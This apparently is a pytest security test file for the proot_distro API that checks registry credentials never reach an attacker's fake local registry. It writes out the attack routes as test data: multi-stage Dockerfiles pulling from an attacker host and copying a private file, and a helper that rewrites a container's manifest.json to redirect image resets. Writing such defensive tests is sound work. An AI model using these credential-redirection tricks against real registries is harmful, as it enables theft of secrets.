# Registry credentials given to the Python API go to the registry they were
# given for and nowhere else. Each test here is an attempt to have them
# sent somewhere else: a Dockerfile that names a second registry, an
# install of an image the attacker hosts, and a container that rewrites the
# image reference in its own manifest.json -- which a guest can do on
# Termux, where the runtime tree is bound into non-isolated containers --
# so that `reset_container` authenticates with the attacker's registry.
#
# Both registries are tests/_registry.py's FakeRegistry on 127.0.0.1. The
# attacker's records every Authorization header it receives; none may
# carry the victim's password or a token the victim's registry issued.

import json
import os

import pytest

from _registry import CA_FILE, FakeRegistry, basic
from proot_distro import constants
from proot_distro.api import (
    InvalidArgumentError, ProotDistro, RegistryCredentials,
)
from proot_distro.helpers.docker import transport

FILES = [{"name": "etc/motd", "type": "file", "data": b"private bits\n"}]
CONFIG = {"os": "linux", "config": {}}
ALICE = basic("alice", "s3cret")


@pytest.fixture
def registries(monkeypatch):
    """(victim, attacker): a private registry and one recording headers."""
    monkeypatch.setenv("no_proxy", "*")
    monkeypatch.setenv("SSL_CERT_FILE", CA_FILE)
    monkeypatch.setattr(transport, "_verified_opener",
                        transport._build_opener(False))
    monkeypatch.setattr(transport, "_insecure_opener", None)
    victim = FakeRegistry()
    attacker = FakeRegistry()
    # The attacker accepts anyone's password, so a leaked one would be
    # "checked" and used rather than refused before it is recorded.
    attacker.users = {"alice": "s3cret"}
    victim.add_image("team/private", "1", FILES, CONFIG)
    attacker.add_image("evil/base", "1", FILES, CONFIG)
    attacker.public.add("evil/base")
    try:
        yield victim, attacker
    finally:
        victim.close()
        attacker.close()


def _assert_nothing_reached(attacker, victim):
    leaked = {ALICE} | victim.issued()
    for seen in attacker.seen():
        assert seen.authorization not in leaked, seen
        assert not seen.authorization.startswith("Basic "), seen


def _scoped(victim):
    return RegistryCredentials("alice", "s3cret", registry=victim.host())


def test_a_dockerfile_cannot_send_scoped_credentials_to_its_own_registry(
        registries, tmp_path):
    victim, attacker = registries
    context = tmp_path / "ctx"
    context.mkdir()
    (context / "Dockerfile").write_text(
        f"FROM {victim.host()}/team/private:1 AS private\n"
        f"FROM {attacker.host()}/evil/base:1\n"
        "COPY --from=private /etc/motd /stolen-motd\n"
    )

    result = ProotDistro(credentials=_scoped(victim)).build(
        context, tags=["exfil:1"]
    )

    assert [image.reference for image in result.images] == ["exfil:1"]
    assert any(seen.authorization == ALICE for seen in victim.seen())
    assert attacker.seen(), "the attacker's base was pulled anonymously"
    _assert_nothing_reached(attacker, victim)


def test_a_provider_scoping_its_answer_is_held_to_it(registries, tmp_path):
    victim, attacker = registries
    context = tmp_path / "ctx"
    context.mkdir()
    (context / "Dockerfile").write_text(
        f"FROM {victim.host()}/team/private:1 AS private\n"
        f"FROM {attacker.host()}/evil/base:1\n"
    )

    # A careless provider answers every request with the same, scoped,
    # credentials. The scope is what decides, not the provider.
    ProotDistro(credential_provider=lambda _request: _scoped(victim)).build(
        context, tags=["exfil-provider:1"]
    )

    _assert_nothing_reached(attacker, victim)


def test_installing_an_attacker_image_sends_scoped_credentials_nowhere(
        registries):
    victim, attacker = registries

    ProotDistro(credentials=_scoped(victim)).install(
        f"{attacker.host()}/evil/base:1", name="evilbox"
    )

    assert victim.seen() == []
    _assert_nothing_reached(attacker, victim)


def test_unscoped_credentials_never_reach_a_dockerfile_registry(
        registries, tmp_path):
    victim, attacker = registries
    context = tmp_path / "ctx"
    context.mkdir()
    (context / "Dockerfile").write_text(
        f"FROM {attacker.host()}/evil/base:1\n"
    )

    with pytest.raises(InvalidArgumentError):
        ProotDistro(credentials=RegistryCredentials("alice", "s3cret")).build(
            context, tags=["exfil-unscoped:1"]
        )

    assert attacker.seen() == []


def _redirect_manifest(name, image_ref):
    """Do what a guest can: rewrite the container's recorded image."""
    path = os.path.join(constants.CONTAINERS_DIR, name, "manifest.json")
    with open(path, encoding="utf-8") as fh:
        data = json.load(fh)
    data["image_ref"] = image_ref
    with open(path, "w", encoding="utf-8") as fh:
        json.dump(data, fh)


@pytest.mark.parametrize("configure", [
    lambda victim: {"credentials": _scoped(victim)},
    lambda victim: {"credential_provider": lambda request: (
        _scoped(victim) if request.registry == victim.host() else None
    )},
])
def test_a_guest_cannot_steer_reset_credentials_to_its_registry(
        registries, configure):
    victim, attacker = registries
    pd = ProotDistro(**configure(victim))
    pd.install(f"{victim.host()}/team/private:1", name="victimbox")
    assert any(seen.authorization == ALICE for seen in victim.seen())

    _redirect_manifest("victimbox", f"{attacker.host()}/evil/base:1")
    pd.reset_container("victimbox")

    assert attacker.seen(), "reset followed the manifest anonymously"
    _assert_nothing_reached(attacker, victim)
